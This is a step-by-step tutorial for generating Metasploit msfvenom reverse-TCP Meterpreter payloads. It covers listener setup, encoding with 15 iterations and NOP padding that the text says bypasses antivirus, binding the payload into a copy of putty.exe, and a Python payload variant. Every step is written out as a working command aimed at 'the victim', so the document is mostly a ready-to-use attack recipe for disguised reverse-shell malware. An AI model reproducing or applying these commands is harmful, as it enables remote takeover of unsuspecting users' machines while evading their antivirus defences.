### ⚙️ Step 1: Basic Payload Generation
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=5555 -f exe -o shell.exe
```

- Payload: Reverse TCP (Meterpreter)

- Output Format: .exe

- LHOST & LPORT: Your attack machine IP and listener port

### 🚀 Step 2: Start Metasploit Handler
```
msfconsole
```
- Inside Metasploit:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.112
set LPORT 5555
run
```
- Run the generated shell.exe on the victim machine to receive a Meterpreter shell.

### 🔁 Step 3: Advanced Payloads
- List Formats and Encoders
```
msfvenom --list formats
msfvenom --list encoders
```

### Example: Encoder x64/zutto_dekiru
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=5555 
-a x64 -e x64/zutto_dekiru -i 15 --platform windows -n 500 -f exe -o hello.exe
```
- -i 15: Encode 15 iterations

- -n 500: Add 500 NOPs

- Obfuscates payload to bypass AV

### 🧪 Step 4: Bind Payload to Existing EXE
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=5555 \
-x putty.exe -f exe -o PUTTY.exe
```
- -x putty.exe: Use Putty binary as a template

### 🐍 Step 5: Generate Python Payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=5555 -f python -o payload.py

```
- Useful for embedding in scripts or further obfuscation

### ✅ Final Step: Exploitation
- Run the malicious file on the victim.

- Keep your handler (msfconsole) running.

- Once the connection is established, Meterpreter will open:

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
```